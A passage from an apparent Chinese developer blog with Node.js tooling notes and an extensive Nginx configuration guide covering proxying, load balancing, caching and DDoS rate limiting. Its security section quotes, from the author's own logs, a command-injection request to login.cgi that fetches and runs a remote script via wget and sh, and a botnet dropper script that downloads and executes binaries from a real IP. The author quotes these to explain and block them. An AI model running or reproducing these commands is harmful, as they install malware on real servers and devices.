webpack,webpack还只是个local file。 这也就是写在script里面的原因了: 让npm去node_modules里面找一个叫做webpack的依赖，然后运行webpack。 webpack.config.js const path = require(&#39;path&#39;); module.exports = { entry:{ app:[&#39;babel-polyfill&#39;,&#39;./src/app.js&#39;] }, output:{ path:path.resolve(__dirname,&quot;build&quot;), filename:&quot;app.bundle.js&quot; }, module:{ loaders:[ { test:/\\.js?$/, exclude:/node_modules/, loader:&quot;babel-loader&quot;, query:{ presets:[&#39;env&#39;] } } ] } }; yarnyarn 是facebook设计的，yarn的速度要比npm快。在windows平台上推荐使用msi安装包安装。 npm install expressyarn add express 这俩是一样的,一些常用的command yarn inityarn global add nodemonyarn outdatedyarn cache cleanyarn run dev // yarn dev 其实run都可以省略yarn upgrade express eslint修改配置，让js文件每一行后面都得加冒号(allow semi colons)allow semi colons in javascript eslint在.eslintrc中，添加custom rules &quot;rules&quot;: { &quot;semi&quot;: [2, &quot;always&quot;] } node js不支持es2015的import 和export语法，需要使用mudule的话，可使用commonJs，即:其实这事说来就是node对于绝大多数es2015的语法都支持了，偏偏import,export这一套就不支持。node社区最终决定使用mjs文件后缀 // library.js module.export.awesome = function () { consle.log(&#39;awesome&#39;); }; // index.js var library = require(&#39;./library&#39;); library.awesome(); // 需要注意两点， // 1. require()后面跟的路径是(&#39;./library&#39;)，是指在当前路径下，而不是在node_modules那个大的文件夹里面找 // 2. require(&#39;./library&#39;) 和require(&#39;./library.js&#39;)没有区别 sourcemaps开发过程中使用的是ES2015代码，编译之后就成了非常长的es5代码，在浏览器里面几乎无法断点。使用sourcemap就能在浏览器中将es5代码“反编译”成ES2015代码，还可以打断点。 好用的modulepath(core module, 无需安装)http(core module, 无需安装)expressnodemon // 实时监控本地文件变化，重启服务，安装npm install nodemon -gbody-parserejspm2 //starting an node app as a bcakground servicemongoose Howto debugvscode debug node js的方式，打开调试窗口，点击那个小齿轮(打开launch.json)。直接在代码中断点即可。注意底下有一个debug console(调试控制台)，可以输入变量，查看当前值，和一些大型Ide很像。 在chrome里面debug的方式：node –inspect app.js ## 一闪而过了node –inspect-brk app.js ##在第一行就给我停下来 在chrome的地址栏输入 about:inspect , open dedicated DevTools for Node，点一下就会出现一个小窗口或者f12，会出现一个绿色的node的图标，点一下和上面那个open dedicated DevTools for Node是一样的Debugging in 2017 with Node.js process.env.NODE_ENVif (process.env.NODE_ENV === &#39;production&#39; ) { // }else { // } // windows上可以这么设置 set NODE_ENV=dev //直接写在js里面也行 process.env.NODE_ENV = &#39;production&#39;; 写在package.json的script里面也是可以的。 &quot;scripts&quot;: { &quot;start&quot;: &quot;set NODE_ENV=dev &amp;&amp; node app.js&quot; } For Mac/Linux users, you can simply type: export MONGOLAB_URI=&quot;mongodb://username:password@ds01316.mlab.com:1316/food&quot; For Windows users: SET MONGOLAB_URI=mongodb://username:password@ds01316.mlab.com:1316/food After setting the Environment variables you need to call the Environment Variable into your code. You can do it by typing this var url = process.env.MONGOLAB_URI; process.env.XXX只是环境变量而已 =============================================================================开发环境用nodemon，生产环境用pm2(PM2的优胜之处在于当你要将app需要多核处理的时候，PM2内部集成的负载均衡可以让你很容易的去指定运行多少个实例。) node里面就不要用Ajax了，推荐axios，原生自带也有https。而node中的一些module也不能用于浏览器端，比如fs这种属于偏Low level的api node js api","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"Nginx使用记录","date":"2017-12-10T16:12:43.000Z","path":"2017/12/10/2017-12-10-nginx-culinary-tips/","text":"linode的docs里面是这么介绍的 nginx is a lightweight, high performance web server designed to deliver large amounts of static content quickly with efficient use of system resources. nginx’s strong point is its ability to efficiently serve static content, like plain HTML and media files. Some consider it a less than ideal server for dynamic content. 1.安装不推荐在windows上安装nginxInstalling nginx on windows安装教程，google ‘installing nginx on ubuntu’基本上就是把DigitalOcean写的这些复制粘贴过来 当然apt get 默认的源可能有些老，所以如果追求最新版本的话，可以添加ppa sudo apt-get update sudo apt-get install nginx ## We can list the applications configurations that ufw knows how to work with by typing: sudo ufw app list sudo ufw allow &#39;Nginx HTTP&#39; sudo ufw status 1.1 安装失败的解决方案 Job for nginx.service failed because the control process exited with error code. See “systemctl status nginx.service” and “journalctl -xe” for details.invoke-rc.d: initscript nginx, action “start” failed.● nginx.service - A high performance web server and a reverse proxy server Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled) 根据Nginx installation error in Ubuntu 16.04解决方案: Check your nginx error log:sudo cat /var/log/nginx/error.log|lessThen try again:sudo apt-get update;sudo apt-get upgrade 我看到的是: 2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use)2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use)2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use)2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use)2017/12/10 22:21:46 [emerg] 2485#2485: bind() to 0.0.0.0:80 failed (98: Address already in use) 就是80端口被占用了，看下谁在用: lsof -i:80 2. 常用command## 查看当前status systemctl status nginx ## stop sudo systemctl stop nginx ## start sudo systemctl start nginx ##重启 sudo systemctl restart nginx ## 改了配置文件之后可以直接reload，而不会失去连接 sudo systemctl reload nginx ## nginx默认开机启动的,取消开机启动 sudo systemctl disable nginx ## 加入开机启动 sudo systemctl enable nginx 3. 常用目录和文件(直接从DigitalOcean复制过来了) /var/www/html ## 就是放默认首页的地方（原因是 /etc/nginx/sites-enabled/default这里面设置的） /etc/nginx: The Nginx configuration directory. All of the Nginx configuration files reside here./etc/nginx/nginx.conf: The main Nginx configuration file. This can be modified to make changes to the Nginx global configuration./etc/nginx/sites-available/: The directory where per-site “server blocks” can be stored. Nginx will not use the configuration files found in this directory unless they are linked to the sites-enabled directory (see below). Typically, all server block configuration is done in this directory, and then enabled by linking to the other directory./etc/nginx/sites-enabled/: The directory where enabled per-site “server blocks” are stored. Typically, these are created by linking to configuration files found in the sites-available directory./etc/nginx/snippets: This directory contains configuration fragments that can be included elsewhere in the Nginx configuration. Potentially repeatable configuration segments are good candidates for refactoring into snippets. 访问日志都在这里 /var/log/nginx/access.log: Every request to your web server is recorded in this log file unless Nginx is configured to do otherwise./var/log/nginx/error.log: Any Nginx errors will be recorded in this log. 在debian系上，默认的根目录在这个位置 /usr/share/nginx/usr/share/nginx/html ##最近的版本挪到这里了 用nginx -V 查看那个–prefix=“实际使用的路径” 4.配置文件4.1 不想用80端口怎么办(比如跟apache冲突了)修改 /etc/nginx/nginx.conf文件config文件的大致结构就是这样,来自stackoverflow user www-data; worker_processes 1; error_log /var/log/nginx/error.log; pid /var/run/nginx.pid; events { worker_connections 1024; # multi_accept on; } http { include /etc/nginx/mime.types; log_format main &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39; &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39; &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;; ##这个log format是可以自定义log格式的 access_log /var/log/nginx/access.log; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; tcp_nodelay on; gzip on; gzip_disable &quot;MSIE [1-6]\\.(?!.*SV1)&quot;; include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; ## include F:/nginx/conf/sites-enabled/default; 必须是绝对路径，include不认相对路径 server { listen 81; location / { proxy_pass http://94.143.9.34:9500; proxy_set_header Host $host:81; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Via &quot;nginx&quot;; } } } mail { See sample authentication script at: http://wiki.nginx.org/NginxImapAuthenticateWithApachePhpScript auth_http localhost/auth.php; pop3_capabilities &quot;TOP&quot; &quot;USER&quot;; imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;; server { listen localhost:110; protocol pop3; proxy on; } server { listen localhost:143; protocol imap; proxy on; } } 比如想要通过81端口访问，加上这么一行 server { listen 81; server_name example.org www.example.org; root /var/www/html/ } Checking nginx config file syntax nginx -t -c conf/nginx.confnginx -s quit //gracefully stop on windowsnginx -s stop // force stop on windows 4.2 限制日志文件的大小根据上面的config文件，默认的访问日志是在/var/log/nginx/access.log这个文件里面。限制这个文件的大小的方法：serverfault 访问日志的设置，以及图形化统计。其实还可以结合awk做文本统计 /etc/logrotate.d/nginx /var/log/nginx/access_log { rotate 7 size 5k dateext dateformat -%Y-%m-%d missingok compress sharedscripts postrotate test -r /var/run/nginx.pid &amp;&amp; kill -USR1 `cat /var/run/nginx.pid` endscript } 需要注意的是，当网站访问量大后，日志数据就会很多，如果全部写到一个日志文件中去，文件会变得越来越大。文件大速度就会慢下来，比如一个文件几百兆。写入日志的时候，会影响操作速度。另外，如果我想看看访问日志，一个几百兆的文件，下载下来打开也很慢。为了方便对日志进行分析计算，需要对日志进行定时切割。定时切割的方式有按照月切割、按天切割，按小时切割等。最常用的是按天切割。脚本 4.3 分享特定目录(serve static files)How to serve a directory of static files at a certain location path with nginx? server { listen 80; server_name something.nateeagle.com; location /something { alias /home/neagle/something; index index.html index.htm; } } 有的时候会看到两种写法 location /static/ { root /var/www/app/static/; autoindex off; } ## 结果是/var/www/app/static/static目录 location /static/ { alias /var/www/app/static/; autoindex off; } ##这才是/var/www/app/static目录 location里面写root还是alias 那alias标签和root标签到底有哪些区别呢？ alias后跟的指定目录是准确的,并且末尾必须加“/”，否则找不到文件 location /c/ { alias /a/ } 如果访问站点http://location/c ，访问的就是/a/目录下的站点信息。 2、root后跟的指定目录是上级目录，并且该上级目录下要含有和location后指定名称的同名目录才行，末尾“/”加不加无所谓。 location /c/ { root /a/ } 如果访问站点http://location/c，访问的就是/a/c目录下的站点信息。 3.一般情况下，在location /中配置root，在location /other中配置alias是一个好习惯。 在windows平台下可以这么写 location / { root D:/VDownload; index index.html index.htm; } nginx -s reload 然后重启nginx 4.4 Nginx软链接目测不能用软链接 4.5 Nginx通过CORS实现跨域在nginx.conf里找到server项,并在里面添加如下配置 location / { add_header &#39;Access-Control-Allow-Origin&#39; &#39;http://example.com&#39;; add_header &#39;Access-Control-Allow-Credentials&#39; &#39;true&#39;; add_header &#39;Access-Control-Allow-Headers&#39; &#39;Authorization,Content-Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With&#39;; add_header &#39;Access-Control-Allow-Methods&#39; &#39;GET,POST,OPTIONS&#39;; ... } 但上述配置只能实现允许一个domain或者*实现跨域，Nginx允许多个域名跨域访问在location context的上层添加 map $http_origin $corsHost { default 0; &quot;~http://www.example.com&quot; http://www.example.com; &quot;~http://m.example.com&quot; http://m.example.com; &quot;~http://wap.example.com&quot; http://wap.example.com; } server { listen 80; server_name www.example2.com; root /usr/share/nginx/html; location / { add_header Access-Control-Allow-Origin $corsHost; } } 5. proxy_pass根据how-to-set-up-a-node-js-application-for-production-on-ubuntu-14-04 /etc/nginx/sites-available/default server { listen 80; server_name example.com; location / { proxy_pass http://APP_PRIVATE_IP_ADDRESS:8080; // A应用跑在8080端口，外部访问http://example.com/即可访问应用服务 proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } location /app2 { proxy_pass http://APP_PRIVATE_IP_ADDRESS:8081; // B应用跑在8081端口，外部访问http://example.com/app2即可访问应用服务 proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; } } 5.1 pratical take awaysnginx配置location总结及rewrite规则写法 ddos防御from mitigating-ddos-attacks-with-nginx-and-nginx-plus/ allow a single client IP address to attempt to login only every 2 seconds (equivalent to 30 requests per minute): 1. Limiting the Rate of Requestseg: 单ip访问login接口频率不能超过2秒每次。 limit_req_zone $binary_remote_addr zone=one:10m rate=30r/m; server { ... location /login.html { limit_req zone=one; ... } } 2. Limiting the Number of Connectionseg: 单ip访问/store/不能创建超过10条connections limit_conn_zone $binary_remote_addr zone=addr:10m; server { # ... location /store/ { limit_conn addr 10; # ... } } 3. Closing Slow Connectionseg: 限定nginx一条connection写client header和写client body的时间间隔为5s，默认为60s server { client_body_timeout 5s; client_header_timeout 5s; } 4. 黑名单// 123.123.123.1 through 123.123.123.16 拉黑 location / { deny 123.123.123.0/28; # ... } location / { deny 123.123.123.3; deny 123.123.123.5; deny 123.123.123.7; # ... } //只允许特定白名单 location / { allow 192.168.1.0/24; deny all; # ... } 5. ngx_http_proxy_module的configurationproxy_cache_use_stale当客户端请求一项过期的资源时，只发送一次请求，在backend server返回新的资源之前，不再发送新的请求，并只向客户端返回已有的过期资源。这有助于缓解backend server的压力。proxy_cache_key:包含内置三个key$scheme$proxy_host$request_uri。但不要添加$query_string，这会造成过多的caching. 6. 几种情况是应该直接拉黑的 Requests to a specific URL that seems to be targetedRequests in which the User-Agent header is set to a value that does not correspond to normal client trafficRequests in which the Referer header is set to a value that can be associated with an attackRequests in which other headers have values that can be associated with an attack location /foo.php { deny all; //直接让这个接口不响应 } location / { if ($http_user_agent ~* foo|bar) { return 403; //User-Agent中有foo或者bar的时候直接forbidden } # ... } // NGINX Plus提供的 // An NGINX or NGINX Plus instance can usually handle many more simultaneous connections than the backend servers it is load balancing. //作为代理，nginx能够接受的连接数要远超其代理的后台服务 upstream website { server 192.168.100.1:80 max_conns=200; server 192.168.100.2:80 max_conns=200; queue 10 timeout=30s; } 5.2 Nginx模块http_image_filter_module（图片裁剪模块）首先查看是否已安装http_image_filter_module模块 nginx -V/etc/nginx/nginx.conf文件添加 location /image { alias &quot;/imgdirectory/&quot;; ## 这样直接输入 yourip/image/imgname.jpg就能返回原始图片 } location ~* (.*\\.(jpg|jpeg|gif|png))!(.*)!(.*)$ { ## 这个是匹配全站图片资源 set $width $3; set $height $4; rewrite &quot;(.*\\.(jpg|jpeg|gif|png))(.*)$&quot; $1; ## 这样输入 yourip/image/imgname.jpg!200!200就能返回200*200的图片 } location ~* /imgs/.*\\.(jpg|jpeg|gif|png|jpeg)$ { root &quot;/var/www/&quot;; image_filter resize $width $height; } 亲测上述可行，python也有类似库thumbor 关于正则匹配： ## 比如匹配全站所有的结尾图片 location ~* \\.(jpg|gif|png)$ { image_filter resize 500 500; } ### 匹配某个目录所有图片 location ~* /image/.*\\.(jpg|gif|png)$ { image_filter resize 500 500; } 更多直接google吧。关于这个var/www目录，按照惯例，这个目录里面就应该放example.com,anothersite.com,myblog.com,…这种根据一个个site名来放置资源和html文件。一个文件夹里放一个site相关的资源，当然这只是惯例。 添加黑名单##获取各个IP访问次数 awk &#39;{print $1}&#39; nginx.access.log |sort |uniq -c|sort -n sudo last | awk &#39;{ print $(NF-7)}&#39; | sort | uniq -c | sort -n //统计登录ip次数 查看某个时间端中访问的日志，2018年7月28日上午10点到2018年7月30日下午1点的日志 cat access.log | sed -n &#39;/28\\/Jul\\/2018:10/,/30\\/Jul\\/2018:13/p&#39; | more ## 新建一个黑名单文件 blacklist.conf ,放在 nginx/conf下面。 ##添加一个IP ，deny 192.168.59.1; ### 在http或者server模块引入 include blacklist.conf ; ##需要重启服务器, nginx -s reload; 即可生效 防御DDOS是一个系统工程，这里只是一小点。 5.3 return rewrite and try_filesserver { listen 80; listen 443 ssl; server_name www.old-name.com; return 301 $scheme://www.new-name.com$request_uri; } 301 (Moved Permanently) //上面的scheme是http或者https，request_url就是请求的url。 rewrite就更加复杂一点，比如可以manipulate urlHere’s a sample NGINX rewrite rule that uses the rewrite directive. It matches URLs that begin with the string /download and then include the /media/ or /audio/ directory somewhere later in the path. It replaces those elements with /mp3/ and adds the appropriate file extension, .mp3 or .ra. The $1 and $2 variables capture the path elements that aren’t changing. As an example, /download/cdn-west/media/file1 becomes /download/cdn-west/mp3/file1.mp3. If there is an extension on the filename (such as .flv), the expression strips it off and replaces it with .mp3. server { # ... rewrite ^(/download/.*)/media/(\\w+)\\.?.*$ $1/mp3/$2.mp3 last; rewrite ^(/download/.*)/audio/(\\w+)\\.?.*$ $1/mp3/$2.ra last; return 403; # ... } In the following example, NGINX serves a default GIF file if the file requested by the client doesn’t exist. When the client requests (for example) http://www.domain.com/images/image1.gif, NGINX first looks for image1.gif in the local directory specified by the root or alias directive that applies to the location (not shown in the snippet). If image1.gif doesn’t exist, NGINX looks for image1.gif/, and if that doesn’t exist, it redirects to /images/default.gif. That value exactly matches the second location directive, so processing stops and NGINX serves that file and marks it to be cached for 30 seconds. try_files $uri $uri/ =404; ## 这么写的话，碰到找不到的，浏览器直接返回一个丑到爆的ngix默认404页面。 location /images/ { try_files $uri $uri/ /images/default.gif; } location = /images/default.gif { expires 30s; ## expire这个就是跟缓存相关的 expires 1d; expires 24h; } location ~ \\.(htm|html|gif|jpg|jpeg|png|bmp|ico|css|js|txt)$ { root /opt/webapp; expires 24h; ## 这样直接根据后缀设定缓存也行啊， } 5.4 NGINX LOAD BALANCING 负载均衡Load balancing across multiple application instances is a commonly used technique for optimizing resource utilization, maximizing throughput, reducing latency, and ensuring fault-tolerant configurations. http { upstream backend { server backend1.example.com weight=5; server backend2.example.com down; #服务标记为离线，不再使用 server 192.0.0.1 backup; ## 备份服务器，其他全部宕机了才启用 } server { location / { proxy_pass http://backend; ## 所有的访问http://backend的流量都被导向上面的三个服务器 ## proxy_pass只是其中一种，还有fastcgi_pass, memcached_pass, uwsgi_pass, scgi_pass proxy_set_header X-Real-IP $remote_addr; #把client的真实ip而不是nginx机器的ip传给后端服务 proxy_set_header Host $http_host; #把client请求中header里面的HOST传给后端服务 ## $host不带端口 $http_host带端口 proxy_pass_header Server; ## 这个其实可以更改Response中返回的Server的值，意思就是让Nginx不要插手Server这个KEY，当然还得上游server设置好header } } } 导向策略有多种：1.Round-robin (默认) 1, 2 , 1, 2 ,1 ….如此反复2.least_conn 连接数最少的优先（如果有weight，加权选择） upstream backend { least_conn; server backend1.example.com; server backend2.example.com; } ip_hash (一个ip只会导向固定的一个server，这个适合做ab test)这些是主要的策略 6. 问题速查 nginx.service - A high performance web server and a reverse proxy server Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled) Active: failed (Result: exit-code) since Fri 2017-12-29 20:12:50 EST; 3min 21s ago 启动失败，检查/var/log/nginx/error.log 或者/var/log/syslog。windows下应该在nginx/logs/error.log文件里面windows平台下查找当前正在跑的nginx进程： tasklist /fi “imagename eq nginx.exe” benchmark，压力测试Apache Benchmarking tool. ab -kc 1000 -n 10000 http://www.some-site.cc/tmp/index.html-n表示一共要请求多少次,-c表示每次请求模拟多少个并发 在http response中隐藏nginx版本：在server块添加 server_tokens off; 7. 整理一下linode的文章linoe关于nginx配置的文章写得特别好/etc/nginx/nginx.conf http { ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable &quot;msie6&quot;; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; // gzip基本上就是用cpu资源节省带宽，默认是1，最高是9，越大压缩效果越好，也越费cpu # gzip_buffers 16 8k; # gzip_http_version 1.1; include /etc/nginx/sites-enabled/*; //引入site-enabled中所有文件 include /etc/nginx/conf.d/*.conf; //或者引入config.d文件夹中所有.config文件 } 关于sites-enabled和sites-available这两个文件夹。一般都是把真正的.conf文件写在sites-available里面，然后在sites-enable通过symbolic link去链接到sites-available中的文件。这样，万一哪天突然打算关掉某个website，直接删掉那个symbolic link就行了，但真正的配置文件不会被删掉 sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/ sudo ln -s /etc/nginx/sites-available/test.com /etc/nginx/sites-enabled/ 这个也算作规范吧 http这个directive下一层就是server了,一般来说，一个虚拟域名(virtual domain)就对应着一个server块。 接下来的东西就不要写在/etc/nginx/nginx.conf文件里了,这里应该是一个domain写一个.conf文件/etc/nginx/sites-available/default server { listen 80 default_server; // default_server means this virtual host will answer requests on port 80 that don’t specifically match another virtual host’s listen statement. listen [::]:80 default_server ipv6only=on; // 这个是给ipv6用的 listen 80; ## 80端口 listen *:80; ## 80端口，和上面一样 listen 8080; ## 8080端口 listen *:8080; ## 8080端口，和上面一样 root /usr/share/nginx/html; index index.html index.htm; ##有Index.html直接返回，没有的话尝试index.htm文件 # Make site accessible from http://localhost/ ## localhost其实就是127.0.0.1，这是写在/etc/hosts里面的 server_name localhost; ## 这可以使得一个ip地址支持多个domain( This allows multiple domains to be served from a single IP address.) ### 这时的文件名应该叫/etc/nginx/sites-available/example.com server_name example.com www.example.com; ## example.com www.example.com都支持,example.com就支持旗下所有子域名。www.example.com, foo.example.com，等等 ### 这时的文件名应该叫/etc/nginx/sites-available/example.com server_name example.*; ## example开头的都行 ## 下面这俩意思一样，这时的文件名应该叫/etc/nginx/sites-available/example.com server_name *.example.com; server_name .example.com; ### 这时的文件名应该叫/etc/nginx/sites-available/example server_name example.*; ## example.com, example.org, example.net, example.foo.com, etc. ### 文件名随意啦/etc/nginx/sites-available/multi-list server_name example.com linode.com icann.org whatever.you.wantwite.isok.org; ## 一个server_name后面跟任何域名都是没问题的 ## 比如说你在局域网有个linux机器挂着nginx，你可以创建这样一个文件，/etc/nginx/sites-available/local server_name localhost linode galloway; ### 这样局域网(LAN)内用户访问linode，galloway都能走到你这一块指定的走向（再具体一点，假如你是个前端开发，你跟测试说，手机连我代理，访问galloway就行了） ### /etc/nginx/sites-available/catchall server_name &quot;&quot;; ## nginx will process all requests that either do not have a hostname, or that have an unspecified hostname, such as requests for the IP address itself. ## 要么是没有hostname，要么是没有一个具体的hostname，说的就是直接浏览器输入ip地址的那帮人 location / { # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ /index.html; ## 说的很清楚，先当做文件试试，再当做文件夹试试，再不行试试index.html # Uncomment to enable naxsi on this location # include /etc/nginx/naxsi.rules } } 关于server_name这个参数，nginx网站上在how nginx process requests中是这么说的 一个.conf文件里这么写是没有问题的.还有这个server_name写成domain name或者ip address都是可以的. server { listen 80; server_name example.org www.example.org; ... } server { listen 80; server_name example.net www.example.net; ... } server { listen 80; server_name example.com www.example.com; ... } server_name对应客户端发来的request中的HOST这个header，一个个去匹配，没有的话就默认用第一个。当然我非要第二个作为默认的也是可以的，加一个default_server就行了 server { listen 80 default_server; server_name example.net www.example.net; ... } 这个server_name是如何从request中提取出来的比方说你在浏览器里敲了” http://myserver/ “,浏览器就会去请求DNS server来确定这个domain对应的ip address。随后”myserver”这几个字会被写进HTTP 请求“Host: myserver”。这是生产环境正常的逻辑。如果开发过程中的话，想要修改这个Host似乎改hosts可以实现sudo vim /etc/hosts 192.168.122.245 nagios.monitor.com 192.168.122.245 localhost 192.168.122.245 www.netdatamonitor.com netdatamonitor.com 127.0.0.1 www.baidu.com # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 这样自己在浏览器中敲www.baidu.com，本地nginx config文件中server_name 为baidu.com的也能响应了。 access_log是跟着server走的，毕竟你不希望两台不相干的服务器的访问日志搅和在一起/etc/nginx/sites-available/example.com文件中写入这么一行 access_log /srv/www/example.com/logs/access.log; 关闭日志也是可以的，不过请不要随便这么做 /etc/nginx/nginx.confaccess_log off; 接下来是location /etc/nginx/sites-available/example.com location / { } location /images/ { } location /blog/ { } location /planet/ { } location /planet/blog/ { } /* 现在客户端访问http://example.com/，假如前面server_name配置了一个example.com.那个这次请求被location / 获取 Nginx总是会使用匹配程度最高的：比如 Request: http://example.com/planet/blog/ or http://example.com/planet/blog/about/ 这俩请求会走到location /planet/blog/ { }而不是location /planet/ { } */ location ~ IndexPage\\.php$ { } location ~ ^/BlogPlanet(/|/index\\.php)$ { } ## 向上箭头表示以此开始，美元符号代表以此结束，反斜杠代表转义字符，波浪号表示这是一个正则，大小写敏感! 所有的jpg和png？ location ~^ \\.(jpg|png)$ { } 想要大小写不敏感？ location ~* \\.(pl|cgi|perl|prl)$ { } location ~* \\.(md|mdwn|txt|mkdn)$ { } 上面这俩表示所有.pl,.PL,.Pl,pL...各种各样的大小写都照单全收 前面这个~符号代表后面跟着的是一个正则表达式（nginx uses Perl Compatible Regular Expressions (PCRE).）但这里还是大小写敏感的正则表达式 location ~* \\.(pl|cgi|perl|prl)$ { } location ~* \\.(md|mdwn|txt|mkdn)$ { } // 想要大小写不敏感~*即可 ## 这回.pl, .PL, .cgi, .CGI, .perl, .Perl, .prl结尾的都能匹配了 location ^~ /images/IndexPage/ { } location ^~ /blog/BlogPlanet/ { } 这个^~符号表示告诉nginx，如果找到了匹配，就不再往下找了。意思就是说 /images/IndexPage/info 也会直接用这个了，就算后面有更佳匹配location /images/IndexPage/info { }也不管 location = / { } 注意这个中间的等号，意思是访问只有url是http://example.com/的时候才匹配 ，而 http://example.com/index.html 就不会匹配 用=有一个好处就是匹配会稍微快一点，常用于匹配一些特别热门的url Directives are processed in the following order:（搜索url匹配的顺序如下）1： Exact string matches are processed first.（就是url字符一模一样的最先匹配上并停止后续搜索）2： Remaining literal string directives are processed next. 如果碰到了^~修饰的匹配的字符，停止搜索3： All location directives with regular expressions (~ and ~* ) are processed.正则表达式搜索开始4： 如果上述都没找到，If no regular expressions match, the most specific literal string match is used. Make sure each file and folder under a domain will match at least one location directive.写配置的时候请确保某个domain下的所有文件都能至少被一条规则匹配上 While nginx’s configuration parser is technically capable of reading nested location blocks, this is neither recommended nor supported. ## 不建议写这种location一层套一层的 [ ] nginx搭建rmtp推流后台搭建nginx-rtmp直播服务器，ffmpeg模拟推流 默认用apt-get安装的nginx是不带rtmp module的，所以需要自己下载源码编译谈到rtmp就不免扯到ffmpeg，在小型vps上还是算了吧。hls的安装方法 只允许某些http method用limit_except这个directive就可以了limit_except HTTP规范要求405的code需要在返回的response中添加一个Allow的header说明哪些方法是被允许的 ========================================================================================================================== add_header not working on ubuntu server? 防盗链之前做爬虫的时候，request的header中不添加refer就会返回一张 固定的图片。这个功能nginx也行 location ~* \\.(gif|jpg|swf)$ { valid_referers none blocked start.igrow.cn sta.igrow.cn; if ($invalid_referer) { rewrite ^/ http://$host/logo.png; } } nginx预设的变量[variable]非常多(http://nginx.org/en/docs/http/ngx_http_core_module.html#var_remote_addr) remote_addr 客户端的ip地址remote_port 客户端的portrequest_method GET或者POSTrequest_uri ## 包含请求参数的原始URI，不包含主机名，如：”/foo/bar.php?arg=baz”。不能修改。scheme ## http或者httpsserver_addr ## 服务器地址server_nameserver_port 根据官方文档，反向代理的时候，只有这俩Header是默认带上的 proxy_set_header Host $proxy_host; proxy_set_header Connection close; 如果客户端发出的请求的HEADER中有HOST这个字段时，那么$host和$http_host都是一样的那要是没有呢？ However, if this field is not present in a client request header then nothing will be passed. In such a case it is better to use the $host variable - its value equals the server name in the “Host” request header field or the primary server name if this field is not present:proxy_set_header Host $host; 个人猜测$host应该代表了server_name这个header If caching is enabled, the header fields “If-Modified-Since”, “If-Unmodified-Since”, “If-None-Match”, “If-Match”, “Range”, and “If-Range” from the original request are not passed to the proxied server. 如果开启了缓存，那么这些跟缓存相关的Header都不会传递给上游服务 如果客户端发出的请求中的HEADER里面的field是一个空字符串。那么这filed不会被传递给上游 修改Nginx的response中的server字段，这种方式可以隐藏当前使用的nginx的版本号在server这个section中添加 server_tokens off; 这样返回的response中就 变成了Server:nginx proxy_set_header X-Powered-By &quot;&quot;; # or proxy_hide_header X-Powered-By; # or more_clear_headers Server; ##直接移除Server这个header ========================================================================================================================nginx怎么清除缓存 实际操作中遇到过的问题在sites-avaliable中写了这么一个default.conf文件server_name 瞎写了一个接着后sites-avaliable中又添加了一个b.conf文件，server_name写的是vps的实际ip。这下所有的请求都被匹配到b.conf文件上了，浏览器里访问静态资源全部都是404。解决办法就是把default.conf文件中瞎写的server_name写成实际的ip地址或者自己买的domain name。 安全问题： 查看下外部曾经尝试过获取那些.php文件cat access.log | awk ‘$7 ~ /.php/ { print $7 }’ | sort -n | uniq -c | sort -nr// awk第七列包含.php的，根据出现次数排序，unique一下，包含次数，反向排序 所有以.php为后缀的资源都不允许访问 location ~ (\\.php$|myadmin) { return 403; } 亲眼见到的一个访问日志“GET /login.cgi?cli=aa%20aa%27;wget%20http://185.172.164.41/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1” 这个aa%20aa%27粘贴到chrome的console里面,decodeURIComponent(“aa%20aa%27”)，按照这样的做法翻译了上面的话如下：“GET /login.cgi?cli=aa aa’;wget http://185.172.164.41/e -O -&gt; /tmp/hk;sh /tmp/hk’$ HTTP/1.1” 至于这个脚本的内容是什么，似乎可以专门filter一下，然后proxy pass给特定的程序，不过这就麻烦了。有专门的蜜罐处理这种行为 后来在日志里面查到这样一个脚本，最终发现下载了一大堆binary file。 #!/bin/sh n=&quot;hakai.mips hakai.arm5 hakai.mpsl hakai.x86_64&quot; http_server=&quot;46.166.185.42&quot; for a in $n do wget http://$http_server/$a -O -&gt; /tmp/$a chmod 777 /tmp/$a /tmp/$a done for a in $n do rm -rf /tmp/$a done 这里有详细的解说 然而nginx是没法在配置文件里面去match上一个queryParameter的 有一个专门的说法叫做nginx 防止注入 if ($request_uri ~* &quot;[+|(%20)]select[+|(%20)]&quot;) { return 404; } 所以根据requesturl来判断就得用上if了redirect-of-all-the-urls 